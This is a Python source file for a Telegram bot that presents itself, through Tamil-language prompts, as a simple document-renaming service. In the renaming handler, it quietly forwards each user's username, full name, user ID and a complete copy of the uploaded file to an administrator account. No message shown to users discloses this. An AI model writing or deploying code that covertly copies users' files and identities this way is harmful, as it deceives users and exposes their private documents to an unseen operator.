from io import BytesIO
import logging
import os
from functools import wraps

from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)

# Conversation states
FILE_RECEIVED, WAIT_FILENAME = range(2)

BOT_TOKEN = os.environ.get("BOT_TOKEN")  # <-- Set this in your environment
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))  # <-- Set admin id here or env var

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Simple decorator to require token set
def require_token(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not BOT_TOKEN or BOT_TOKEN.strip() == "":
            await update.message.reply_text(
                "Bot token not found. Please set BOT_TOKEN environment variable."
            )
            return ConversationHandler.END
        return await func(update, context)

    return wrapped


@require_token
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Vanakkam! இந்த bot-க்கு ஒரு document அனுப்புங்கள். பிறகு நீங்கள் புதிய பெயர் சொல்லுங்க.\n\n"
        "விருப்பமுள்ள கட்டளைகள்: /cancel"
    )
    return FILE_RECEIVED


@require_token
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document
    if not doc:
        await update.message.reply_text("Document அனுப்பவும்.")
        return FILE_RECEIVED

    # Store details
    context.user_data['file_id'] = doc.file_id
    context.user_data['orig_filename'] = doc.file_name or 'unnamed'
    context.user_data['mime_type'] = doc.mime_type

    await update.message.reply_text(
        f"பெயர் மாற்ற வேண்டிய கோப்பை பெற்றுக்கொண்டேன்: {context.user_data['orig_filename']}\n"
        "புதிய filename (extension உடன்) கொடுக்கவும்:\nஉதாரணம்: my_video.mp4"
    )
    return WAIT_FILENAME


@require_token
async def handle_new_filename(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_name = update.message.text.strip()
    user = update.effective_user

    if not new_name:
        await update.message.reply_text("சரியான புதிய பெயரை டைப் செய்க.")
        return WAIT_FILENAME

    file_id = context.user_data.get('file_id')
    if not file_id:
        await update.message.reply_text("முன்பே ஒரு கோப்பை அனுப்புங்கள்.")
        return FILE_RECEIVED

    bot = context.bot
    file = await bot.get_file(file_id)
    bio = BytesIO()
    await file.download_to_memory(out=bio)
    bio.seek(0)

    # Admin message
    admin_msg = (
        f"User sent a file:\n"
        f"— username: @{user.username if user.username else 'N/A'}\n"
        f"— name: {user.full_name}\n"
        f"— user_id: {user.id}\n"
        f"— original filename: {context.user_data.get('orig_filename')}\n"
        f"— new filename requested: {new_name}"
    )

    try:
        if ADMIN_ID != 0:
            await bot.send_message(ADMIN_ID, admin_msg)

            bio_for_admin = BytesIO(bio.getvalue())
            bio_for_admin.name = context.user_data.get('orig_filename')
            bio_for_admin.seek(0)

            await bot.send_document(
                ADMIN_ID, 
                document=bio_for_admin, 
                filename=context.user_data.get('orig_filename')
            )
        else:
            logger.warning("ADMIN_ID not set. Admin won't receive forwarded files.")
    except Exception as e:
        logger.exception("Failed to notify admin: %s", e)

    # Send renamed file to user
    try:
        renamed = BytesIO(bio.getvalue())
        renamed.name = new_name
        renamed.seek(0)

        await bot.send_document(
            chat_id=update.effective_chat.id,
            document=renamed,
            filename=new_name
        )

        await update.message.reply_text(f"Renamed file அனுப்பப்பட்டது: {new_name}")
    except Exception as e:
        logger.exception("Failed to send renamed file: %s", e)
        await update.message.reply_text("கோப்பை பெயரை மாற்றி அனுப்ப முடியவில்லை. தவறு: " + str(e))

    context.user_data.clear()

    return ConversationHandler.END


@require_token
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled.")
    context.user_data.clear()
    return ConversationHandler.END


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start), 
            MessageHandler(filters.Document.ALL, handle_document)
        ],
        states={
            FILE_RECEIVED: [MessageHandler(filters.Document.ALL, handle_document)],
            WAIT_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_new_filename)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True,
    )

    app.add_handler(conv_handler)

    # Start bot (polling mode)
    app.run_polling()


if __name__ == '__main__':
    main()
